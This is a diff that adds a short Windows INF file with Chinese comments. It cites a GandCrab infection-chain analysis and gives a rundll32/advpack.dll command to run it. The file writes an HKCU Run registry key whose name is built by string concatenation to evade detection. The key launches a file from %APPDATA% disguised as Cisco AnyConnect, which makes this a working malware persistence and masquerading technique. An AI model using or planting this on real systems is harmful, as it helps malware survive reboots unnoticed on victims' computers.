@@ -1,0 +1,18 @@
+; INF 支持字符串拼接
+; https://www.cybereason.com/blog/gandcrab-evasive-infection-chain
+;
+; 安装方法
+; cmd /k rundll32 advpack.dll,LaunchINFSection %APPDATA%\CiscoTAP.inf,,1,
+
+[Version]
+Signature=$CHICAGO$
+
+[DefaultInstall]
+AddReg=AddRegSection
+
+[AddRegSection]
+HKCU,Software\Microsoft\Windows\CurrentVersion\Run,%K_1%%K_2%,,"%APPDATA%\CiscoAny.exe"
+
+[strings]
+K_1=Cisco
+K_2=Any
